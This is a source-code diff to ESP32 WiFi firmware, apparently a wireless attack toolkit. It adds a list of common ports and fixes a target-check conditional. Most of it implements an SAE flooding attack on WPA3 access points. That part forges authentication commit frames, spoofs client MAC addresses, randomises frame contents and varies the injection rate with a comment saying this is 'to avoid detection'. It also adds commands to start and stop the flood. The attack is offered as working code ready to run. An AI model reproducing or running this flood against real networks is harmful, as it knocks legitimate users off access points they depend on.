@@ -58,6 +58,76 @@ static void wifi_beacon_list_task(void *param);
 uint16_t ap_count;
 wifi_ap_record_t *scanned_aps;
 const char *TAG = "WiFiManager";
+
+station_ap_pair_t station_ap_list[MAX_STATIONS];
+int station_count = 0;
+void *beacon_task_handle = NULL;
+void *deauth_task_handle = NULL;
+int beacon_task_running = 0;
+
+const uint16_t COMMON_PORTS[] = {
+    20,    // FTP Data
+    21,    // FTP Control
+    22,    // SSH
+    23,    // Telnet
+    25,    // SMTP
+    53,    // DNS
+    69,    // TFTP
+    80,    // HTTP
+    88,    // Kerberos
+    110,   // POP3
+    111,   // RPCBind
+    123,   // NTP
+    135,   // MSRPC
+    137,   // NetBIOS Name Service
+    138,   // NetBIOS Datagram Service
+    139,   // NetBIOS Session Service
+    143,   // IMAP
+    161,   // SNMP
+    389,   // LDAP
+    443,   // HTTPS
+    445,   // SMB
+    465,   // SMTPS
+    500,   // IKE (VPN)
+    514,   // Syslog
+    515,   // LPD/LPR Printer
+    587,   // SMTP (submission)
+    631,   // IPP (Printing)
+    636,   // LDAPS
+    993,   // IMAPS
+    995,   // POP3S
+    1080,  // SOCKS Proxy
+    1433,  // MSSQL
+    1434,  // MSSQL Browser
+    1521,  // Oracle DB
+    1701,  // L2TP
+    1723,  // PPTP
+    1883,  // MQTT
+    2049,  // NFS
+    2082,  // cPanel
+    2083,  // cPanel SSL
+    2086,  // WHM
+    2087,  // WHM SSL
+    2222,  // Alternative SSH
+    3306,  // MySQL
+    3389,  // RDP
+    5060,  // SIP
+    5222,  // XMPP
+    5432,  // PostgreSQL
+    5900,  // VNC
+    5901,  // VNC-1
+    5902,  // VNC-2
+    6379,  // Redis
+    8080,  // HTTP Proxy
+    8443,  // HTTPS Alt
+    8883,  // MQTT SSL
+    9100,  // Printer
+    27017, // MongoDB
+    32400, // Plex Media Server
+    51820, // Wireguard
+    55443  // Alt HTTP
+};
+const size_t NUM_PORTS = sizeof(COMMON_PORTS) / sizeof(COMMON_PORTS[0]);
 static char PORTALURL[512] = "";
 static char domain_str[128] = "";
 EventGroupHandle_t wifi_event_group;
@@ -2492,7 +2562,7 @@ void wifi_manager_print_scan_results_with_oui() {
                scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
                scanned_aps[i].rssi);
 
-#ifdef CONFIG_IDF_TARGET_ESP32C5 && CONFIG_IDF_TARGET_ESP32C6
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
         {
             int ch = scanned_aps[i].primary;
             const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
@@ -3568,4 +3638,243 @@ void wifi_manager_eapollogoff_display(void) {
 void wifi_manager_eapollogoff_help(void) {
     printf("Usage: attack -e (for EAPOL logoff attack)\n");
     TERMINAL_VIEW_ADD_TEXT("Usage: attack -e (for EAPOL logoff attack)\n");
+}
+
+// SAE Handshake Flooding Attack Implementation
+static TaskHandle_t sae_flood_task_handle = NULL;
+static TaskHandle_t sae_flood_display_task_handle = NULL;
+static bool sae_flood_running = false;
+static int sae_flood_packets_sent = 0;
+static uint8_t sae_target_bssid[6];
+static int sae_target_channel = 1;
+static int sae_injection_rate = 25;
+
+// SAE Commit frame template (simplified for ESP32)
+static const uint8_t SAE_COMMIT_TEMPLATE[] = {
+    // 802.11 Authentication frame header
+    0xb0, 0x00,                     // Frame Control (Authentication)
+    0x00, 0x00,                     // Duration
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (will be filled)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be filled)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be filled)
+    0x00, 0x00,                     // Sequence Control
+    
+    // Authentication frame body
+    0x03, 0x00,                     // Algorithm (SAE = 3)
+    0x01, 0x00,                     // Transaction Sequence (Commit = 1)
+    0x00, 0x00,                     // Status Code (Success = 0)
+    0x13, 0x00,                     // Group ID (19 = P-256)
+    
+    // Simplified scalar (32 bytes for P-256)
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
+    0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
+    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
+    0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
+    
+    // Simplified element (64 bytes for P-256 - X and Y coordinates)
+    0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
+    0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30,
+    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
+    0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40,
+    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
+    0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50,
+    0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
+    0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60
+};
+
+static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
+    uint8_t frame[sizeof(SAE_COMMIT_TEMPLATE)];
+    memcpy(frame, SAE_COMMIT_TEMPLATE, sizeof(SAE_COMMIT_TEMPLATE));
+    
+    // Fill in MAC addresses
+    memcpy(frame + 4, sae_target_bssid, 6);   // Destination (AP)
+    memcpy(frame + 10, src_mac, 6);           // Source (spoofed client)
+    memcpy(frame + 16, sae_target_bssid, 6);  // BSSID
+    
+    // Randomize scalar and element to create unique frames
+    for (int i = 32; i < sizeof(SAE_COMMIT_TEMPLATE); i++) {
+        frame[i] = esp_random() & 0xFF;
+    }
+    
+    // Add some randomization to sequence control for better variation
+    uint16_t seq = (esp_random() & 0xFFF0) | (frame_counter & 0x000F);
+    frame[22] = seq & 0xFF;
+    frame[23] = (seq >> 8) & 0xFF;
+    
+    // Vary the Group ID occasionally for more diversity
+    if ((frame_counter % 50) == 0) {
+        uint16_t group_ids[] = {19, 20, 21}; // P-256, P-384, P-521
+        uint16_t group_id = group_ids[esp_random() % 3];
+        frame[30] = group_id & 0xFF;
+        frame[31] = (group_id >> 8) & 0xFF;
+    }
+    
+    // Inject the frame
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+    sae_flood_packets_sent++;
+}
+
+static void sae_flood_task(void *param) {
+    uint8_t spoofed_mac[6];
+    uint8_t base_mac[6];
+    int frame_counter = 0;
+    
+    // Get base MAC address
+    esp_wifi_get_mac(WIFI_IF_STA, base_mac);
+    
+    printf("SAE flood attack started on channel %d\n", sae_target_channel);
+    TERMINAL_VIEW_ADD_TEXT("SAE flood attack started on channel %d\n", sae_target_channel);
+    printf("Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+           sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
+           sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
+    TERMINAL_VIEW_ADD_TEXT("Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+                          sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
+                          sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
+    printf("Injection rate: %d frames/second\n", sae_injection_rate);
+    TERMINAL_VIEW_ADD_TEXT("Injection rate: %d frames/second\n", sae_injection_rate);
+    
+    while (sae_flood_running) {
+        // Generate spoofed MAC address
+        memcpy(spoofed_mac, base_mac, 6);
+        spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
+        spoofed_mac[5] = frame_counter & 0xFF;
+        
+        // Inject SAE commit frame
+        inject_sae_commit_frame(spoofed_mac, frame_counter);
+        
+        frame_counter = (frame_counter + 1) % 65536;
+        
+        // Rate limiting with variation to avoid detection
+        int variation = (esp_random() % 20) - 10; // +/- 10% variation
+        int actual_rate = sae_injection_rate + (sae_injection_rate * variation / 100);
+        if (actual_rate < 50) actual_rate = 50; // minimum rate
+        if (actual_rate > 200) actual_rate = 200; // reduced maximum rate
+        
+        // Ensure minimum delay to prevent watchdog timeout
+        int delay_ms = 1000 / actual_rate;
+        if (delay_ms < 5) delay_ms = 5; // minimum 5ms delay
+        vTaskDelay(pdMS_TO_TICKS(delay_ms));
+        
+        // Yield to other tasks every 10 frames
+        if ((frame_counter % 10) == 0) {
+            taskYIELD();
+        }
+    }
+    
+    printf("SAE flood task stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+    TERMINAL_VIEW_ADD_TEXT("SAE flood task stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+    sae_flood_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void sae_flood_display_task(void *param) {
+    int last_count = 0;
+    
+    while (sae_flood_running) {
+        int frames_in_period = sae_flood_packets_sent - last_count;
+        int current_rate = frames_in_period / 5;
+        last_count = sae_flood_packets_sent;
+        
+        printf("SAE Flood: %d frames/sec | Total: %d frames\n", 
+               current_rate, sae_flood_packets_sent);
+        TERMINAL_VIEW_ADD_TEXT("SAE Flood: %d frames/sec | Total: %d frames\n", 
+                              current_rate, sae_flood_packets_sent);
+        
+        vTaskDelay(pdMS_TO_TICKS(5000));
+    }
+    
+    sae_flood_display_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+void wifi_manager_start_sae_flood(void) {
+#if !defined(CONFIG_IDF_TARGET_ESP32C5) && !defined(CONFIG_IDF_TARGET_ESP32C6)
+    printf("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
+    TERMINAL_VIEW_ADD_TEXT("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
+    return;
+#endif
+
+    if (sae_flood_running) {
+        printf("SAE flood attack already running\n");
+        TERMINAL_VIEW_ADD_TEXT("SAE flood attack already running\n");
+        return;
+    }
+
+    if (ap_count == 0 || scanned_aps == NULL) {
+        printf("No AP selected. Use 'select -a <index>' first\n");
+        TERMINAL_VIEW_ADD_TEXT("No AP selected. Use 'select -a <index>' first\n");
+        return;
+    }
+    
+    bool supports_wpa3 = false;
+    if (selected_ap.authmode == WIFI_AUTH_WPA3_PSK || 
+        selected_ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK ||
+        selected_ap.authmode == WIFI_AUTH_WPA3_ENTERPRISE) {
+        supports_wpa3 = true;
+    }
+
+    if (!supports_wpa3) {
+        printf("Selected AP does not support WPA3/SAE authentication\n");
+        TERMINAL_VIEW_ADD_TEXT("Selected AP does not support WPA3/SAE authentication\n");
+        printf("AP Auth Mode: %d (WPA3 required)\n", selected_ap.authmode);
+        TERMINAL_VIEW_ADD_TEXT("AP Auth Mode: %d (WPA3 required)\n", selected_ap.authmode);
+        return;
+    }
+
+    memcpy(sae_target_bssid, selected_ap.bssid, 6);
+    sae_target_channel = selected_ap.primary;
+    sae_injection_rate = 100;
+    sae_flood_packets_sent = 0;
+    sae_flood_running = true;
+
+    wifi_manager_start_monitor_mode(NULL);
+    esp_wifi_set_channel(sae_target_channel, WIFI_SECOND_CHAN_NONE);
+
+    xTaskCreate(sae_flood_task, "sae_flood_task", 4096, NULL, 5, &sae_flood_task_handle);
+    xTaskCreate(sae_flood_display_task, "sae_flood_display", 2048, NULL, 3, &sae_flood_display_task_handle);
+
+    char bssid_str[18];
+    snprintf(bssid_str, sizeof(bssid_str), "%02x:%02x:%02x:%02x:%02x:%02x",
+             sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
+             sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
+
+    printf("SAE flood attack started against %s (%s) on channel %d\n", 
+           selected_ap.ssid, bssid_str, sae_target_channel);
+    TERMINAL_VIEW_ADD_TEXT("SAE flood attack started against %s (%s) on channel %d\n", 
+                          selected_ap.ssid, bssid_str, sae_target_channel);
+}
+
+void wifi_manager_stop_sae_flood(void) {
+    if (!sae_flood_running) {
+        printf("SAE flood attack not running\n");
+        TERMINAL_VIEW_ADD_TEXT("SAE flood attack not running\n");
+        return;
+    }
+    
+    sae_flood_running = false;
+    
+    // Wait for tasks to finish
+    if (sae_flood_task_handle) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    if (sae_flood_display_task_handle) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    
+    wifi_manager_stop_monitor_mode();
+    printf("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+    TERMINAL_VIEW_ADD_TEXT("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+}
+
+void wifi_manager_sae_flood_help(void) {
+    printf("SAE Flood Attack - Overwhelms WPA3 APs with commit frames\n");
+    TERMINAL_VIEW_ADD_TEXT("SAE Flood Attack - Overwhelms WPA3 APs with commit frames\n");
+    printf("Rate: 100+ frames/sec with randomization\n");
+    TERMINAL_VIEW_ADD_TEXT("Rate: 100+ frames/sec with randomization\n");
+    printf("Requirements: ESP32-C5/C6, WPA3 AP selected\n");
+    TERMINAL_VIEW_ADD_TEXT("Requirements: ESP32-C5/C6, WPA3 AP selected\n");
+    printf("Usage: scanap -> list -a -> select -a <index> -> saeflood\n");
+    TERMINAL_VIEW_ADD_TEXT("Usage: scanap -> list -a -> select -a <index> -> saeflood\n");
+    printf("Commands: saeflood, stopsaeflood, saefloodhelp\n");
+    TERMINAL_VIEW_ADD_TEXT("Commands: saeflood, stopsaeflood, saefloodhelp\n");
 }
